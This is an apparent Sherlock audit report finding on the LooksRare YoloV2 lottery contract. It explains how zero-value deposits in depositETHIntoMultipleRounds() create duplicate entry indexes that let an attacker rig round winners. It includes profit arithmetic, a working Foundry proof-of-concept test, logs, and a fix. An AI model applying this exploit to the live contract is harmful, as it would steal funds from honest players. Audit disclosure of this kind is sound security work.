# [LooksRare Yolo](https://audits.sherlock.xyz/contests/163/report)

## Findings by Dimulski
| Severity | Title | 
|:--:|:---|
| [H-01](#H-01) | A malicious user can game the system to increase his chances of winning a round | 

## <a id='H-01'></a>[H-01] A malicious user can game the system to increase his chances of winning a round
## Summary
A missing value check in the depositETHIntoMultipleRounds() function allows a malicious user to deposit 0 amount for a round and thus have the same currentEntryIndex 
as the previous non malicious user who entered a round. Due to the implementation of the findUpperBound() function in the Arrays.sol contract, which doesn't expect repeated elements 
in the provided array. 
A malicious user can game the system and either increase his chances of winning the round or guarantee that he is the round winner if certain conditions(described in the below section) are met.

## Vulnerability Detail
In the scenario where a round starts, and all users increment their currentEntryIndex with 1 with each deposit, meaning that they call the deposit() 
function with value equal to the valuePerEntry for the specified round, the system will create only one entrieCount for them. If we have four user do that, 
the first user currentEntryIndex will be equal to 1, the second to 2, the third to 3, and the fourth to 4. The problem arises if a malicious user calls depositETHIntoMultipleRounds(), 
after each single user deposit, with a 0 value, creating a round deposit entry with the same currentEntryIndex, paying nothing but gas. When fulfillRandomWords()
is called back from the VRF contract and a randomWord is supplied the contract will first create the following currentEntryIndexArray

```solidity
uint256[] memory currentEntryIndexArray = new uint256[](count);
for (uint256 i; i < count; ++i) {
                    currentEntryIndexArray[i] = uint256(round.deposits[i].currentEntryIndex);
 }
```
which will contain the following elements [1, 1, 2, 2, 3, 3, 4, 4] , with each second equal element referring to an attacker deposit.
The function then takes the last element of the array as it is the biggest one

```solidity
uint256 currentEntryIndex = currentEntryIndexArray[_unsafeSubtract(count, 1)];
```
and uses it to determine the winningEntry

```solidity
uint256 winningEntry = _unsafeAdd(randomWord % currentEntryIndex, 1);
```

From the above example there are four values that we can expect to have for the winningEntry: 1,2,3,4. The max value is currentEntryIndex.

```solidity
round.winner = round.deposits[currentEntryIndexArray.findUpperBound(winningEntry)].depositor;
```

The findUpperBound() function will always return the second equal entry, for example if the winningEntry is 1, the findUpperBound() will return 1,
corresponding to the index of the attacker deposit. The attacker then has to make sure that he wins the next round by filling the maximum number of 
depositors value with addresses controlled by him. In the scenario where the entry indexes are not incremented by one the attacker still has a better
chance than most to win because if a number that is equal to an arbitrary currentEntryIndex existing in the currentEntryIndexArray, the attacker will 
still win the round. A protocol fee is withheld from the winner of each round. but if paid in LOOKS tokens according to the parameters set in the deployment
script there is a 50% discount. The protocol fee in the deployment script is set to 500 which is equal to 5%. The parameters in the deploy script expect 50
participants per round, so if we get 25 * 0.01 ETH(which is the value per entry) we get 250000000000000000 = 0,25 ETH which will be the profit for the attacker.
He will have to pay fees for winning two rounds. The fee for the first round where there are only 25 real deposits is 12500000000000000 = 0,0125 ETH 
If paying the fees in LOOKs tokens we get the following
(0,0125 ETH + 0.025 ETH ) / 2 = 0.01875 ETH. So the attacker can win 0.25ETH - 0.01875 ETH = 0.23125ETH. 
The attack becomes profitable if there are at least two users in the round that the attacker can game. 
This way he will have to pay 0.0125 ETH in LOOKs for the second round that he has to win and 0.001ETH / 2 = 0.0005ETH for the round where he games users in order to win. 
But he will win 20000000000000000 = 0,02ETH

NOTE: The parameters described in this report have nothing to do with the actual root of the issue, they are used to clarify the attack and the profitability of it.
An arbitrary set of different parameters will result in the same issue. If the protocol fee becomes some astronomical % then the attack may not be profitable.
However very few people will use the protocol if the protocol fee is 50%.

## Proof of Concept
[Gist]()
After following the steps in the above gist add the following to the AuditorsTest.t.sol
```solidity
function test_MaliciousUserCanWinAllRounds() public {
        vm.startPrank(alice);
        vm.deal(alice, valuePerEntryVariable);
        yoloV2.deposit{value: valuePerEntryVariable}(1, _emptyDepositsCalldata());
        vm.stopPrank();

        vm.startPrank(attacker);
        vm.deal(attacker, valuePerEntryVariable);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 0;
        amounts[1] = valuePerEntryVariable;
        yoloV2.depositETHIntoMultipleRounds{value: valuePerEntryVariable}(amounts);
        vm.stopPrank();

        vm.startPrank(bob);
        vm.deal(bob, valuePerEntryVariable);
        yoloV2.deposit{value: valuePerEntryVariable}(1, _emptyDepositsCalldata());
        vm.stopPrank();

        vm.startPrank(attacker1);
        vm.deal(attacker1, valuePerEntryVariable);
        yoloV2.depositETHIntoMultipleRounds{value: valuePerEntryVariable}(amounts);
        vm.stopPrank();

        vm.startPrank(tom);
        valuePerEntryVariable;
        vm.deal(tom, valuePerEntryVariable);
        yoloV2.deposit{value: valuePerEntryVariable}(1, _emptyDepositsCalldata());
        vm.stopPrank();

        vm.startPrank(attacker2);
        vm.deal(attacker2, valuePerEntryVariable);
        yoloV2.depositETHIntoMultipleRounds{value: valuePerEntryVariable}(amounts);
        vm.stopPrank();

        vm.startPrank(john);
        vm.deal(john, valuePerEntryVariable);
        yoloV2.deposit{value: valuePerEntryVariable}(1, _emptyDepositsCalldata());
        vm.stopPrank();

        vm.startPrank(attacker3);
        vm.deal(attacker3, valuePerEntryVariable);
        yoloV2.depositETHIntoMultipleRounds{value: valuePerEntryVariable}(amounts);
        vm.stopPrank();

        /// @notice simulate returning random word 
        uint256[] memory randomWords = new uint256[](1);
        randomWords[0] = 2345782359082359082359082359239741234971239412349234892349234;

        vm.prank(VRF_COORDINATOR);
        VRFConsumerBaseV2(yoloV2).rawFulfillRandomWords(FULFILL_RANDOM_WORDS_REQUEST_ID, randomWords);

        uint40 maximumNumberOfParticipants;
        uint16 roundProtocolFeeBp;
        uint40 cutoffTime;
        address winner;
        IYoloV2.Deposit[] memory deposits;
        IYoloV2.RoundStatus status;
        uint40 drawnAt;
        uint40 numberOfParticipants;
        uint96 roundValuePerEntry;
        uint256 protocolFeeOwed;
        (
            status,
            maximumNumberOfParticipants, 
            roundProtocolFeeBp, 
            cutoffTime, 
            drawnAt, 
            numberOfParticipants, 
            winner, 
            roundValuePerEntry, 
            protocolFeeOwed, 
            deposits
        ) = yoloV2.getRound(1);

        assertTrue(winner == attacker || winner == attacker1 || winner == attacker2 || winner == attacker3);
        console2.log("Protocol fee owed: ", protocolFeeOwed);
        uint40 currentEntryIndexAlice = deposits[0].currentEntryIndex;
        uint40 currentEntryIndexAttacker = deposits[1].currentEntryIndex;
        uint40 currentEntryIndexBob = deposits[2].currentEntryIndex;
        uint40 currentEntryIndexAttacker1 = deposits[3].currentEntryIndex;
        uint40 currentEntryIndexTom = deposits[4].currentEntryIndex;
        uint40 currentEntryIndexAttacker2 = deposits[5].currentEntryIndex;
        uint40 currentEntryIndexJohn = deposits[6].currentEntryIndex;
        uint40 currentEntryIndexAttacker3 = deposits[7].currentEntryIndex;
        console2.log("Alice entry index: ", currentEntryIndexAlice);
        console2.log("Attacker entry index: ", currentEntryIndexAttacker);
        console2.log("Bob entry index: ", currentEntryIndexBob);
        console2.log("Attacker1 entry index: ", currentEntryIndexAttacker1);
        console2.log("Tom entry index: ", currentEntryIndexTom);
        console2.log("Attacker2 entry index: ", currentEntryIndexAttacker2);
        console2.log("John entry index: ", currentEntryIndexJohn);
        console2.log("Attacker3 entry index: ", currentEntryIndexAttacker3);

        /// @notice the attacker guarantees that he wins the second round, as only addresses controled by him are round depositors
        vm.startPrank(attacker4);
        vm.deal(attacker4, valuePerEntryVariable);
        uint256[] memory amountsSecondRound = new uint256[](1);
        amountsSecondRound[0] = valuePerEntryVariable;
        yoloV2.depositETHIntoMultipleRounds{value: valuePerEntryVariable}(amountsSecondRound);
        vm.stopPrank();

        vm.startPrank(attacker5);
        vm.deal(attacker5, valuePerEntryVariable);
        yoloV2.depositETHIntoMultipleRounds{value: valuePerEntryVariable}(amountsSecondRound);
        vm.stopPrank();

        vm.startPrank(attacker6);
        vm.deal(attacker6, valuePerEntryVariable);
        yoloV2.depositETHIntoMultipleRounds{value: valuePerEntryVariable}(amountsSecondRound);
        vm.stopPrank();

        vm.startPrank(attacker7);
        vm.deal(attacker7, valuePerEntryVariable);
        yoloV2.depositETHIntoMultipleRounds{value: valuePerEntryVariable}(amountsSecondRound);
        vm.stopPrank();

        /// @notice simulate returning random word 

        vm.prank(VRF_COORDINATOR);
        VRFConsumerBaseV2(yoloV2).rawFulfillRandomWords(FULFILL_RANDOM_WORDS_REQUEST_ID_2, randomWords);

        uint40 maximumNumberOfParticipants2;
        uint16 roundProtocolFeeBp2;
        uint40 cutoffTime2;
        address winner2;
        IYoloV2.Deposit[] memory deposits2;
        IYoloV2.RoundStatus status2;
        uint40 drawnAt2;
        uint40 numberOfParticipants2;
        uint96 roundValuePerEntry2;
        uint256 protocolFeeOwed2;
        (
            status2,
            maximumNumberOfParticipants2, 
            roundProtocolFeeBp2, 
            cutoffTime2, 
            drawnAt2, 
            numberOfParticipants2, 
            winner2, 
            roundValuePerEntry2, 
            protocolFeeOwed2, 
            deposits2
        ) = yoloV2.getRound(2);

        assertTrue(
            winner2 == attacker || 
            winner2 == attacker1 || 
            winner2 == attacker2 || 
            winner2 == attacker3 ||
            winner2 == attacker4 || 
            winner2 == attacker5 || 
            winner2 == attacker6 || 
            winner2 == attacker7
        );
        console2.log("Protocol fee owed for the second round: ", protocolFeeOwed2);
}
```

```solidity
Logs:
  Protocol fee owed:  2000000000000000
  Alice entry index:  1
  Attacker entry index:  1
  Bob entry index:  2
  Attacker1 entry index:  2
  Tom entry index:  3
  Attacker2 entry index:  3
  John entry index:  4
  Attacker3 entry index:  4
  Protocol fee owed for the second round:  40000000000000
```

To run the test use: ``forge test -vvv --mt test_MaliciousUserCanWinAllRounds``
## Impact
If the conditions specified above (each users increments the entries by one) the attacker can be guaranteed to win each round, If not all entries 
are incremented by one the attacker still has a better chance than most to win, 
because if a number that is equal to an arbitrary currentEntryIndex existing in the currentEntryIndexArray, the attacker will still win the round.

## Code Snippet
https://github.com/sherlock-audit/2024-01-looksrare/blob/main/contracts-yolo/contracts/YoloV2.sol#L312-L362
## Tool used
Manual Review & Foundry

## Recommendation
In depositETHIntoMultipleRounds() function add the following check, to ensure that each amount is bigger than 0, and thus the minimum roundValuePerEntry

```diff
             uint256 depositAmount = amounts[i];
+          require(depositAmount > 0, InvalidValue());
            if (depositAmount % roundValuePerEntry != 0) {
                revert InvalidValue();
            }
```
